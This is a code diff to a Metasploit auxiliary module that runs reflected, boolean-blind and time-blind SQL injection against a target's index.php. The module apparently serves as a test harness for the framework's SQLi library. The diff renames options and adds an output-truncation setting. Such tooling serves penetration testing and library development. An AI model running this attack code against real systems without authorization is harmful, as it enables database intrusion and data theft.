@@ -28,18 +28,19 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RHOST('127.0.0.1'),
         OptString.new('TARGETURI', [true, 'The target URI', '/']),
-        OptInt.new('SQLI_TYPE', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind', 0]),
-        OptString.new('ENCODER', [false, 'an encoder to use (hex for example)', '']),
-        OptBool.new('HEX_ENCODE_STRINGS', [false, 'replace strings in the query with hex numbers?', false]),
+        OptInt.new('SqliType', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind', 0]),
+        OptString.new('Encoder', [false, 'an encoder to use (hex for example)', '']),
+        OptBool.new('HexEncodeStrings', [false, 'Replace strings in the query with hex numbers?', false]),
+        OptInt.new('TruncationLength', [true, 'Test SQLi with truncated output (0 or negative to disable)', 0])
       ]
     )
   end
 
   def boolean_blind
-    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
+    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
     sqli = SQLitei::BooleanBasedBlind.new({
       encoder: encoder,
-      hex_encode_strings: datastore['HEX_ENCODE_STRINGS']
+      hex_encode_strings: datastore['HexEncodeStrings']
     }) do |payload|
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'index.php'),
@@ -59,10 +60,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def reflected
-    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
+    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
+    truncation = datastore['TruncationLength'] <= 0 ? nil : datastore['TruncationLength']
     sqli = SQLitei::Common.new({
       encoder: encoder,
-      hex_encode_strings: datastore['HEX_ENCODE_STRINGS']
+      hex_encode_strings: datastore['HexEncodeStrings'],
+      truncation_length: truncation
     }) do |payload|
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'index.php'),
@@ -78,7 +81,8 @@ class MetasploitModule < Msf::Auxiliary
         if !body
           ''
         else
-          body.strip
+          body = body.strip
+          truncation ? body[0, truncation] : body
         end
       end
     end
@@ -90,10 +94,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def time_blind
-    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
+    encoder = datastore['Encoder'].empty? ? nil : datastore['Encoder'].intern
     sqli = SQLitei::TimeBasedBlind.new({
       encoder: encoder,
-      hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
+      hex_encode_strings: datastore['HexEncodeStrings'],
     }) do |payload|
       res = send_request_cgi({
         'uri' => normalize_uri(target_uri.path, 'index.php'),
@@ -139,7 +143,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    case datastore['SQLI_TYPE']
+    case datastore['SqliType']
     when 0 then reflected
     when 1 then boolean_blind
     when 2 then time_blind
